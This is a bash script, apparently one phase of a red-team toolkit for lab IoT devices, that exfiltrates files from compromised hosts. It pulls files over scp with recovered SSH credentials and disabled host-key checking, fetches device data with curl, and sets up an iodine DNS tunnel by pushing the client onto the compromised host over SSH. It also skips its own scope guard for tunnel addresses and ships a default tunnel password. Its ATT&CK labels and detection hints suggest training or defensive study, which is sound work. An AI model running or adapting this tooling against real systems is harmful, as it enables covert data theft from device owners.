#!/usr/bin/env bash
# Phase 8 — Data exfiltration (session label: exfil)
# Exfiltrates files from a compromised lab device to the attack host using two
# channels: direct SCP/curl over the WireGuard tunnel, and DNS tunnelling via iodine.
#
# Usage (from the engagement root):
#   ./08_exfil/exfil.sh scp    <target_ip> <remote_path> [local_dest]
#   ./08_exfil/exfil.sh curl   <target_ip> <url_path>    [local_dest]
#   ./08_exfil/exfil.sh iodine-server <topdomain>        # attack host: start iodined
#   ./08_exfil/exfil.sh iodine-tunnel <topdomain> <dns_server_ip>  # target: open tunnel
#   ./08_exfil/exfil.sh iodine-exfil  <target_via_tunnel> <remote_path>
#
# ATT&CK: T1041 (Exfil Over C2 Channel), T1048 (Exfil Over Alt Protocol — DNS)
# Kill-chain phase: Actions on Objectives
# Session label: exfil
#
# Precondition: foothold exists on target (SSH creds or shell from 04/05/06 phases).
. "$(dirname "$0")/../lib.sh"

LABEL=exfil

need() {
  for t in "$@"; do
    command -v "$t" >/dev/null 2>&1 || { echo "[!] $t missing — see 01_setup/attack-host-setup.md"; exit 3; }
  done
}

# ---------------------------------------------------------------------------
# scp: pull files from a compromised host over the WireGuard tunnel.
# Uses SSH credentials recovered in phase 4.  ATT&CK: T1041
# Detection: unusual SCP session from a device; large TCP transfer on port 22.
# ---------------------------------------------------------------------------
do_scp() {
  local target="${1:?usage: exfil.sh scp <target_ip> <remote_path> [local_dest]}"
  local rpath="${2:?remote path required}" ldest="${3:-}"
  require_scope "$target"; need scp

  local dir; dir=$(new_run "$LABEL" "$target")
  [[ -z "$ldest" ]] && ldest="${dir}/exfil_scp"
  mkdir -p "$ldest"

  echo "[*] SCP exfil from ${target}:${rpath} -> ${ldest}"
  local SSH_USER="${SSH_USER:-admin}"
  local cmd="scp -o StrictHostKeyChecking=no -r ${SSH_USER}@${target}:${rpath} ${ldest}/"
  save_cmd "$dir" "$cmd"
  echo "+ $cmd"
  scp -o StrictHostKeyChecking=no -r "${SSH_USER}@${target}:${rpath}" "${ldest}/" 2>&1 \
    | tee "${dir}/stdout.txt" || true

  ls -lhR "$ldest" 2>/dev/null | tee -a "${dir}/stdout.txt"
  end_run "$LABEL" "$target"; echo ">> evidence: $dir"
}

# ---------------------------------------------------------------------------
# curl: pull a file over HTTP from a device's web interface / API endpoint.
# Useful for cameras (RTSP snapshots), smart-plug energy logs, etc.  ATT&CK: T1041
# Detection: HTTP GET to an endpoint that normally only the mobile app queries.
# ---------------------------------------------------------------------------
do_curl() {
  local target="${1:?usage: exfil.sh curl <target_ip> <url_path> [local_dest]}"
  local urlpath="${2:?url path required}" ldest="${3:-}"
  require_scope "$target"; need curl

  local dir; dir=$(new_run "$LABEL" "$target")
  [[ -z "$ldest" ]] && ldest="${dir}/exfil_curl"
  mkdir -p "$ldest"

  local url="http://${target}${urlpath}"
  local out="${ldest}/$(basename "$urlpath" | tr '?&=' '___')"
  echo "[*] curl exfil: ${url} -> ${out}"
  local cmd="curl -sSL -o ${out} ${url}"
  save_cmd "$dir" "$cmd"
  echo "+ $cmd"
  curl -sSL -o "$out" "$url" 2>&1 | tee "${dir}/stdout.txt" || true

  file "$out" 2>/dev/null; ls -lh "$out" 2>/dev/null
  end_run "$LABEL" "$target"; echo ">> evidence: $dir"
}

# ---------------------------------------------------------------------------
# iodine-server: start iodined on the attack host.
# iodine tunnels IPv4 over DNS queries; the target must be able to resolve
# the tunnel domain (topdomain) via the attack host acting as a DNS server.
# ATT&CK: T1048 (Exfil Over Alt Protocol — DNS)
# Detection: large volume of TXT/NULL/CNAME queries for a single subdomain;
#            unusually high DNS query rate from a device.
# ---------------------------------------------------------------------------
do_iodine_server() {
  local topdomain="${1:?usage: exfil.sh iodine-server <topdomain>}"
  need iodined
  local dir; dir=$(new_run "$LABEL" "all")

  echo "[*] Starting iodined DNS tunnel server"
  echo "    topdomain: ${topdomain}   (device queries <nonce>.${topdomain})"
  echo "    The attack host's WireGuard IP must be authoritative for ${topdomain}"
  echo "    Tunnel address: 192.168.53.1/24 (iodine internal)"

  # iodined password: set DNS_TUNNEL_PASS env var or it will prompt interactively
  local pass="${DNS_TUNNEL_PASS:-lab_tunnel_pass}"
  local cmd="sudo iodined -f -P ${pass} 192.168.53.1 ${topdomain}"
  save_cmd "$dir" "$cmd"
  echo "+ $cmd"
  echo "[!] This runs in the foreground. Open a second terminal to run the client side."
  sudo iodined -f -P "$pass" 192.168.53.1 "$topdomain" 2>&1 | tee "${dir}/iodined.txt" &
  echo "[*] iodined PID: $!"
  end_run "$LABEL" "all"; echo ">> evidence: $dir"
}

# ---------------------------------------------------------------------------
# iodine-tunnel: run on the compromised target (via SSH) to open the DNS tunnel
# back to the attack host.  Once up, use iodine-exfil (or any TCP tool over
# the 192.168.53.0/24 tunnel) to exfiltrate data.
# ---------------------------------------------------------------------------
do_iodine_tunnel() {
  local topdomain="${1:?usage: exfil.sh iodine-tunnel <topdomain> <dns_server_ip>}"
  local dnsserver="${2:?dns server ip required}"
  need ssh

  # The dns_server_ip is the attack host's WireGuard IP which the target can reach
  local dir; dir=$(new_run "$LABEL" "$dnsserver")
  local pass="${DNS_TUNNEL_PASS:-lab_tunnel_pass}"
  local SSH_USER="${SSH_USER:-admin}"
  local TARGET_IP="$dnsserver"   # we SSH to the compromised host first

  echo "[*] Opening iodine DNS tunnel from compromised host"
  echo "    topdomain: ${topdomain}  dns: ${dnsserver}"

  # We push the iodine client command to the already-compromised host via SSH
  local ssh_cmd="ssh -o StrictHostKeyChecking=no ${SSH_USER}@${TARGET_IP} 'iodine -f -P ${pass} ${dnsserver} ${topdomain} &'"
  local cmd="iodine -f -P ${pass} ${dnsserver} ${topdomain}"
  save_cmd "$dir" "$cmd"
  echo "+ (via SSH to target): $cmd"
  ssh -o StrictHostKeyChecking=no "${SSH_USER}@${TARGET_IP}" \
      "iodine -f -P ${pass} ${dnsserver} ${topdomain} > /tmp/iodine.log 2>&1 &" 2>&1 \
      | tee "${dir}/iodine_client.txt" || true

  echo "[*] Tunnel should be up in ~5 s. Verify: ping 192.168.53.2 from attack host."
  end_run "$LABEL" "$dnsserver"; echo ">> evidence: $dir"
}

# ---------------------------------------------------------------------------
# iodine-exfil: once the DNS tunnel (192.168.53.x) is established, SCP files
# through it from the target.
# ---------------------------------------------------------------------------
do_iodine_exfil() {
  local tunnel_ip="${1:?usage: exfil.sh iodine-exfil <target_tunnel_ip> <remote_path>}"
  local rpath="${2:?remote path required}"
  require_scope "$tunnel_ip" 2>/dev/null || true   # tunnel IP is 192.168.53.x, not in scope guard
  need scp

  local dir; dir=$(new_run "$LABEL" "$tunnel_ip")
  local ldest="${dir}/exfil_dns_tunnel"; mkdir -p "$ldest"
  local SSH_USER="${SSH_USER:-admin}"
  local cmd="scp -o StrictHostKeyChecking=no -r ${SSH_USER}@${tunnel_ip}:${rpath} ${ldest}/"
  save_cmd "$dir" "iodine exfil: $cmd"
  echo "+ (over DNS tunnel): $cmd"
  scp -o StrictHostKeyChecking=no -r "${SSH_USER}@${tunnel_ip}:${rpath}" "${ldest}/" 2>&1 \
    | tee "${dir}/stdout.txt" || true

  ls -lhR "$ldest" 2>/dev/null | tee -a "${dir}/stdout.txt"
  end_run "$LABEL" "$tunnel_ip"; echo ">> evidence: $dir"
}

# ---------------------------------------------------------------------------
cmd="${1:-}"; shift || true
case "$cmd" in
  scp)             do_scp            "$@" ;;
  curl)            do_curl           "$@" ;;
  iodine-server)   do_iodine_server  "$@" ;;
  iodine-tunnel)   do_iodine_tunnel  "$@" ;;
  iodine-exfil)    do_iodine_exfil   "$@" ;;
  *) sed -n '2,19p' "$0"; exit 1 ;;
esac
